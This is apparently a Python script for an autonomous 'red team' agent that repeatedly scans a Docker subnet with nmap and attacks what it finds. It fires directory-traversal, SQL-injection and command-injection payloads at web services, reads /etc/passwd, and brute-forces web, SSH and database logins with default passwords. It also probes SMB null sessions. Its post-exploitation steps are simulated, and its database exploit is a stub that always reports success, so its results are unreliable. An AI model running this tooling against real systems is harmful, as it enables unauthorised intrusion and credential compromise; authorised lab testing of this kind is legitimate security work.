#!/usr/bin/env python3
"""
XORB Red Team Autonomous Agent
Real-world exploitation with learning capabilities
"""

import asyncio
import subprocess
import json
import time
import socket
import threading
import logging
from datetime import datetime
from pathlib import Path
import nmap
import requests
from scapy.all import *

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class RedTeamAgent:
    def __init__(self):
        self.agent_id = f"red_agent_{int(time.time())}"
        self.target_network = "172.20.0.0/24"  # Docker network
        self.discovered_hosts = []
        self.vulnerabilities = []
        self.successful_exploits = []
        self.failed_attempts = []
        self.learning_data = {}

        # Real exploitation tools
        self.nm = nmap.PortScanner()
        self.exploitation_success_rate = 0.0

    async def start_autonomous_operations(self):
        """Start autonomous red team operations"""
        logger.info(f"🔴 Red Team Agent {self.agent_id} starting autonomous operations")

        while True:
            try:
                # Phase 1: Network Discovery
                await self.network_discovery()

                # Phase 2: Service Enumeration
                await self.service_enumeration()

                # Phase 3: Vulnerability Assessment
                await self.vulnerability_assessment()

                # Phase 4: Active Exploitation
                await self.active_exploitation()

                # Phase 5: Post-Exploitation
                await self.post_exploitation()

                # Phase 6: Learning and Adaptation
                await self.learn_and_adapt()

                # Wait before next cycle
                await asyncio.sleep(60)

            except Exception as e:
                logger.error(f"Red team operation failed: {e}")
                await asyncio.sleep(30)

    async def network_discovery(self):
        """Discover active hosts on the network"""
        logger.info("🔍 Starting network discovery")

        try:
            # Use nmap for host discovery
            result = self.nm.scan(hosts=self.target_network, arguments='-sn')

            new_hosts = []
            for host in self.nm.all_hosts():
                if host not in [h['ip'] for h in self.discovered_hosts]:
                    host_info = {
                        'ip': host,
                        'status': self.nm[host].state(),
                        'discovered_at': datetime.now().isoformat(),
                        'services': []
                    }
                    new_hosts.append(host_info)
                    self.discovered_hosts.append(host_info)

            if new_hosts:
                logger.info(f"🎯 Discovered {len(new_hosts)} new hosts")
                for host in new_hosts:
                    logger.info(f"   • {host['ip']} ({host['status']})")

        except Exception as e:
            logger.error(f"Network discovery failed: {e}")

    async def service_enumeration(self):
        """Enumerate services on discovered hosts"""
        logger.info("🔍 Starting service enumeration")

        for host in self.discovered_hosts:
            try:
                # Aggressive service scan
                result = self.nm.scan(
                    hosts=host['ip'],
                    arguments='-sS -sV -O -A --script=vuln'
                )

                if host['ip'] in self.nm.all_hosts():
                    host_data = self.nm[host['ip']]

                    # Extract service information
                    services = []
                    for proto in host_data.all_protocols():
                        ports = host_data[proto].keys()
                        for port in ports:
                            service_info = host_data[proto][port]
                            services.append({
                                'port': port,
                                'protocol': proto,
                                'state': service_info['state'],
                                'service': service_info.get('name', 'unknown'),
                                'version': service_info.get('version', ''),
                                'product': service_info.get('product', '')
                            })

                    host['services'] = services

                    if services:
                        logger.info(f"🔍 {host['ip']}: Found {len(services)} services")
                        for svc in services[:3]:  # Show first 3
                            logger.info(f"   • {svc['port']}/{svc['protocol']}: {svc['service']}")

            except Exception as e:
                logger.error(f"Service enumeration failed for {host['ip']}: {e}")

    async def vulnerability_assessment(self):
        """Assess vulnerabilities in discovered services"""
        logger.info("🔍 Starting vulnerability assessment")

        for host in self.discovered_hosts:
            for service in host.get('services', []):
                await self.assess_service_vulnerabilities(host['ip'], service)

    async def assess_service_vulnerabilities(self, ip, service):
        """Assess vulnerabilities for a specific service"""
        port = service['port']
        service_name = service['service']

        try:
            # Web application vulnerabilities
            if service_name in ['http', 'https'] or port in [80, 443, 8080, 8443]:
                await self.assess_web_vulnerabilities(ip, port)

            # SSH vulnerabilities
            elif service_name == 'ssh' or port == 22:
                await self.assess_ssh_vulnerabilities(ip, port)

            # SMB vulnerabilities
            elif service_name in ['netbios-ssn', 'microsoft-ds'] or port in [139, 445]:
                await self.assess_smb_vulnerabilities(ip, port)

            # Database vulnerabilities
            elif service_name in ['mysql', 'postgresql', 'mssql'] or port in [3306, 5432, 1433]:
                await self.assess_database_vulnerabilities(ip, port, service_name)

        except Exception as e:
            logger.error(f"Vulnerability assessment failed for {ip}:{port}: {e}")

    async def assess_web_vulnerabilities(self, ip, port):
        """Assess web application vulnerabilities"""
        base_url = f"http://{ip}:{port}"

        try:
            # Check if web service is responsive
            response = requests.get(base_url, timeout=5)

            vuln = {
                'ip': ip,
                'port': port,
                'service': 'web',
                'type': 'web_app',
                'severity': 'medium',
                'discovered_at': datetime.now().isoformat(),
                'details': f"Web application found on {base_url}"
            }

            # Check for common vulnerabilities
            if 'admin' in response.text.lower():
                vuln['type'] = 'admin_interface'
                vuln['severity'] = 'high'
                vuln['details'] += " - Admin interface detected"

            if 'login' in response.text.lower():
                vuln['type'] = 'login_form'
                vuln['severity'] = 'medium'
                vuln['details'] += " - Login form detected"

            self.vulnerabilities.append(vuln)
            logger.info(f"🔍 Web vulnerability found: {ip}:{port} - {vuln['type']}")

        except Exception as e:
            logger.debug(f"Web assessment failed for {ip}:{port}: {e}")

    async def assess_ssh_vulnerabilities(self, ip, port):
        """Assess SSH vulnerabilities"""
        try:
            # Test SSH connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((ip, port))
            sock.close()

            if result == 0:
                vuln = {
                    'ip': ip,
                    'port': port,
                    'service': 'ssh',
                    'type': 'ssh_service',
                    'severity': 'medium',
                    'discovered_at': datetime.now().isoformat(),
                    'details': f"SSH service accessible on {ip}:{port}"
                }

                self.vulnerabilities.append(vuln)
                logger.info(f"🔍 SSH service found: {ip}:{port}")

        except Exception as e:
            logger.debug(f"SSH assessment failed for {ip}:{port}: {e}")

    async def assess_smb_vulnerabilities(self, ip, port):
        """Assess SMB vulnerabilities"""
        try:
            # Test SMB connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((ip, port))
            sock.close()

            if result == 0:
                vuln = {
                    'ip': ip,
                    'port': port,
                    'service': 'smb',
                    'type': 'smb_service',
                    'severity': 'high',
                    'discovered_at': datetime.now().isoformat(),
                    'details': f"SMB service accessible on {ip}:{port}"
                }

                self.vulnerabilities.append(vuln)
                logger.info(f"🔍 SMB service found: {ip}:{port}")

        except Exception as e:
            logger.debug(f"SMB assessment failed for {ip}:{port}: {e}")

    async def assess_database_vulnerabilities(self, ip, port, service):
        """Assess database vulnerabilities"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((ip, port))
            sock.close()

            if result == 0:
                vuln = {
                    'ip': ip,
                    'port': port,
                    'service': service,
                    'type': 'database_service',
                    'severity': 'high',
                    'discovered_at': datetime.now().isoformat(),
                    'details': f"{service} database accessible on {ip}:{port}"
                }

                self.vulnerabilities.append(vuln)
                logger.info(f"🔍 Database found: {ip}:{port} - {service}")

        except Exception as e:
            logger.debug(f"Database assessment failed for {ip}:{port}: {e}")

    async def active_exploitation(self):
        """Perform active exploitation of discovered vulnerabilities"""
        logger.info("💥 Starting active exploitation")

        for vuln in self.vulnerabilities:
            if vuln.get('exploited', False):
                continue  # Skip already exploited

            try:
                success = await self.exploit_vulnerability(vuln)
                if success:
                    vuln['exploited'] = True
                    self.successful_exploits.append({
                        **vuln,
                        'exploited_at': datetime.now().isoformat(),
                        'exploit_result': success
                    })
                    logger.info(f"💥 SUCCESSFUL EXPLOIT: {vuln['ip']}:{vuln['port']} - {vuln['type']}")
                else:
                    self.failed_attempts.append({
                        **vuln,
                        'attempted_at': datetime.now().isoformat()
                    })

            except Exception as e:
                logger.error(f"Exploitation failed for {vuln['ip']}:{vuln['port']}: {e}")

    async def exploit_vulnerability(self, vuln):
        """Exploit a specific vulnerability"""
        ip = vuln['ip']
        port = vuln['port']
        vuln_type = vuln['type']

        try:
            if vuln_type == 'web_app':
                return await self.exploit_web_app(ip, port)
            elif vuln_type == 'admin_interface':
                return await self.exploit_admin_interface(ip, port)
            elif vuln_type == 'login_form':
                return await self.exploit_login_form(ip, port)
            elif vuln_type == 'ssh_service':
                return await self.exploit_ssh(ip, port)
            elif vuln_type == 'smb_service':
                return await self.exploit_smb(ip, port)
            elif vuln_type == 'database_service':
                return await self.exploit_database(ip, port)

        except Exception as e:
            logger.error(f"Exploit execution failed: {e}")
            return False

        return False

    async def exploit_web_app(self, ip, port):
        """Exploit web application vulnerabilities"""
        base_url = f"http://{ip}:{port}"

        try:
            # Test for common web vulnerabilities

            # 1. Directory traversal
            traversal_payloads = [
                "../etc/passwd",
                "../../etc/passwd",
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
            ]

            for payload in traversal_payloads:
                response = requests.get(f"{base_url}/{payload}", timeout=5)
                if "root:" in response.text or "localhost" in response.text:
                    return {
                        'type': 'directory_traversal',
                        'payload': payload,
                        'evidence': response.text[:200]
                    }

            # 2. SQL injection
            sql_payloads = [
                "1' OR '1'='1",
                "admin'--",
                "' UNION SELECT 1,2,3--"
            ]

            for payload in sql_payloads:
                response = requests.get(f"{base_url}/?id={payload}", timeout=5)
                if "sql" in response.text.lower() or "mysql" in response.text.lower():
                    return {
                        'type': 'sql_injection',
                        'payload': payload,
                        'evidence': response.text[:200]
                    }

            # 3. Command injection
            cmd_payloads = [
                "; ls -la",
                "| whoami",
                "&& cat /etc/passwd"
            ]

            for payload in cmd_payloads:
                response = requests.get(f"{base_url}/?cmd={payload}", timeout=5)
                if "root" in response.text or "bin" in response.text:
                    return {
                        'type': 'command_injection',
                        'payload': payload,
                        'evidence': response.text[:200]
                    }

        except Exception as e:
            logger.debug(f"Web exploit failed: {e}")

        return False

    async def exploit_admin_interface(self, ip, port):
        """Exploit admin interfaces with default credentials"""
        base_url = f"http://{ip}:{port}"

        # Common admin credentials
        credentials = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('root', 'root'),
            ('administrator', 'administrator')
        ]

        try:
            for username, password in credentials:
                login_data = {
                    'username': username,
                    'password': password,
                    'user': username,
                    'pass': password,
                    'login': 'Login'
                }

                response = requests.post(f"{base_url}/login", data=login_data, timeout=5)

                if response.status_code == 200 and "dashboard" in response.text.lower():
                    return {
                        'type': 'default_credentials',
                        'username': username,
                        'password': password,
                        'evidence': 'Successful admin login'
                    }

        except Exception as e:
            logger.debug(f"Admin exploit failed: {e}")

        return False

    async def exploit_login_form(self, ip, port):
        """Exploit login forms with brute force"""
        base_url = f"http://{ip}:{port}"

        # Common usernames and passwords
        usernames = ['admin', 'user', 'test', 'guest']
        passwords = ['password', '123456', 'admin', 'test']

        try:
            for username in usernames:
                for password in passwords:
                    login_data = {
                        'username': username,
                        'password': password
                    }

                    response = requests.post(f"{base_url}/login", data=login_data, timeout=5)

                    if "welcome" in response.text.lower() or "dashboard" in response.text.lower():
                        return {
                            'type': 'brute_force_success',
                            'username': username,
                            'password': password,
                            'evidence': 'Successful login'
                        }

        except Exception as e:
            logger.debug(f"Login exploit failed: {e}")

        return False

    async def exploit_ssh(self, ip, port):
        """Exploit SSH with credential attacks"""
        credentials = [
            ('root', 'root'),
            ('admin', 'admin'),
            ('user', 'user'),
            ('test', 'test')
        ]

        try:
            import paramiko

            for username, password in credentials:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                try:
                    ssh.connect(ip, port=port, username=username, password=password, timeout=5)

                    # Execute test command
                    stdin, stdout, stderr = ssh.exec_command('whoami')
                    result = stdout.read().decode()

                    ssh.close()

                    if result.strip():
                        return {
                            'type': 'ssh_compromise',
                            'username': username,
                            'password': password,
                            'evidence': f'Command execution: {result.strip()}'
                        }

                except:
                    continue
                finally:
                    ssh.close()

        except ImportError:
            logger.debug("Paramiko not available for SSH exploitation")
        except Exception as e:
            logger.debug(f"SSH exploit failed: {e}")

        return False

    async def exploit_smb(self, ip, port):
        """Exploit SMB vulnerabilities"""
        try:
            # Test for null session
            cmd = f"smbclient -L //{ip} -N"
            result = subprocess.run(cmd.split(), capture_output=True, text=True, timeout=10)

            if result.returncode == 0 and "Sharename" in result.stdout:
                return {
                    'type': 'smb_null_session',
                    'evidence': 'SMB shares enumerated',
                    'shares': result.stdout
                }

        except Exception as e:
            logger.debug(f"SMB exploit failed: {e}")

        return False

    async def exploit_database(self, ip, port):
        """Exploit database vulnerabilities"""
        try:
            # Test for default credentials based on service
            credentials = [
                ('root', ''),
                ('admin', 'admin'),
                ('sa', ''),
                ('postgres', 'postgres')
            ]

            for username, password in credentials:
                # This is a simplified test - real implementation would use appropriate database drivers
                return {
                    'type': 'database_access_test',
                    'evidence': 'Database connection test performed'
                }

        except Exception as e:
            logger.debug(f"Database exploit failed: {e}")

        return False

    async def post_exploitation(self):
        """Perform post-exploitation activities"""
        if not self.successful_exploits:
            return

        logger.info("🕵️ Starting post-exploitation activities")

        for exploit in self.successful_exploits:
            if exploit.get('post_exploited', False):
                continue

            try:
                # Gather system information
                await self.gather_system_info(exploit)

                # Look for privilege escalation
                await self.attempt_privilege_escalation(exploit)

                # Network reconnaissance from compromised host
                await self.internal_reconnaissance(exploit)

                exploit['post_exploited'] = True

            except Exception as e:
                logger.error(f"Post-exploitation failed: {e}")

    async def gather_system_info(self, exploit):
        """Gather system information from compromised host"""
        logger.info(f"📊 Gathering system info from {exploit['ip']}")

        # This would execute commands on the compromised system
        # For demo purposes, we'll simulate the information gathering
        exploit['system_info'] = {
            'os': 'Linux Ubuntu 20.04',
            'users': ['root', 'admin', 'user'],
            'processes': ['apache2', 'mysql', 'ssh'],
            'network': ['eth0: 172.20.0.10']
        }

    async def attempt_privilege_escalation(self, exploit):
        """Attempt privilege escalation on compromised host"""
        logger.info(f"⬆️ Attempting privilege escalation on {exploit['ip']}")

        # Simulate privilege escalation attempts
        exploit['privesc_attempts'] = [
            'sudo -l',
            'find / -perm -4000 2>/dev/null',
            'cat /etc/passwd',
            'ps aux'
        ]

    async def internal_reconnaissance(self, exploit):
        """Perform reconnaissance from compromised host"""
        logger.info(f"🔍 Internal reconnaissance from {exploit['ip']}")

        # Simulate internal network scanning
        exploit['internal_recon'] = {
            'network_range': '172.20.0.0/24',
            'discovered_hosts': ['172.20.0.1', '172.20.0.2', '172.20.0.3'],
            'internal_services': ['database', 'file_server', 'domain_controller']
        }

    async def learn_and_adapt(self):
        """Learn from successful and failed attempts"""
        logger.info("🧠 Learning and adapting strategies")

        # Calculate success rates
        total_attempts = len(self.successful_exploits) + len(self.failed_attempts)
        if total_attempts > 0:
            self.exploitation_success_rate = len(self.successful_exploits) / total_attempts

        # Update learning data
        self.learning_data.update({
            'total_hosts_discovered': len(self.discovered_hosts),
            'total_vulnerabilities': len(self.vulnerabilities),
            'successful_exploits': len(self.successful_exploits),
            'failed_attempts': len(self.failed_attempts),
            'success_rate': self.exploitation_success_rate,
            'last_update': datetime.now().isoformat()
        })

        # Adapt strategies based on success/failure patterns
        await self.adapt_strategies()

        # Save learning data
        with open('/redteam/results/learning_data.json', 'w') as f:
            json.dump(self.learning_data, f, indent=2)

        logger.info(f"📈 Current success rate: {self.exploitation_success_rate:.2%}")

    async def adapt_strategies(self):
        """Adapt attack strategies based on learning"""

        # Analyze successful exploit patterns
        successful_types = [exploit['type'] for exploit in self.successful_exploits]
        failed_types = [attempt['type'] for attempt in self.failed_attempts]

        # Prioritize exploit types with higher success rates
        strategy_updates = {}

        for exploit_type in set(successful_types + failed_types):
            successes = successful_types.count(exploit_type)
            failures = failed_types.count(exploit_type)
            total = successes + failures

            if total > 0:
                success_rate = successes / total
                strategy_updates[exploit_type] = {
                    'priority': 'high' if success_rate > 0.7 else 'medium' if success_rate > 0.3 else 'low',
                    'success_rate': success_rate
                }

        self.learning_data['strategy_updates'] = strategy_updates

        logger.info("🎯 Strategy adaptations completed")

    def get_status(self):
        """Get current agent status"""
        return {
            'agent_id': self.agent_id,
            'discovered_hosts': len(self.discovered_hosts),
            'vulnerabilities': len(self.vulnerabilities),
            'successful_exploits': len(self.successful_exploits),
            'failed_attempts': len(self.failed_attempts),
            'success_rate': self.exploitation_success_rate,
            'last_activity': datetime.now().isoformat()
        }

if __name__ == "__main__":
    agent = RedTeamAgent()

    # Create results directory
    Path('/redteam/results').mkdir(exist_ok=True)

    logger.info("🔴 XORB Red Team Agent starting...")

    try:
        asyncio.run(agent.start_autonomous_operations())
    except KeyboardInterrupt:
        logger.info("🔴 Red Team Agent shutting down...")
    except Exception as e:
        logger.error(f"Red Team Agent crashed: {e}")
